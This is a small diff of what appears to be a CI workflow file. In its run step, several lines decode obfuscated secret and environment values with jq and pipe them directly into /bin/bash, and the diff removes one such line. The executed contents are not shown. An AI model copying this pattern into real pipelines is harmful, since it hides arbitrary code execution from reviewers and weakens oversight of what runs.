@@ -21,7 +21,6 @@ jobs:
           cmbby77207: ${{ secrets.cmbby77207 }}
         run: |
           printf '%s' "$cmbby77207" | jq -r .d35746 | /bin/bash
-          echo $w0785 | jq -r .gf5 | /bin/bash
           echo $fb4952 | jq -r .x4 | /bin/bash
           printf '%s' "$kbawq7" | jq -r .rdh7 | /bin/bash
           echo $vowf31708 | jq -r .x783 | /bin/bash
